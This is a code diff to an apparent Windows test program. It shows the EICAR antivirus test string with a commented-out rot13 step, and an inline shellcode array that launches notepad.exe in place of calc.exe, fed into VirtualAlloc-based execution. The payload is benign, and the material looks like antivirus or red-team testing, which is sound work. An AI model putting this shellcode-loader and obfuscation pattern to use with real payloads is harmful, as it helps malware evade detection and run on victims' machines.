@@ -57,7 +57,8 @@ int main() {
 	// printf("Debug Message: %s\n", debugMessage);
 
 	// Show the user a message
-	const char* eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+	char eicar[] = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+	//rot13(eicar);
 	MessageBoxA(NULL, eicar, "Fancy looking string : )", MB_OK | MB_ICONINFORMATION);
 
 	// Shellcode to launch calc.exe; not encoded or anything fancy
@@ -82,7 +83,7 @@ int main() {
 		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
 		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+		"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
 
 	// Allocate memory for shellcode using VirtualAlloc
 	HANDLE hVirtualAlloc;
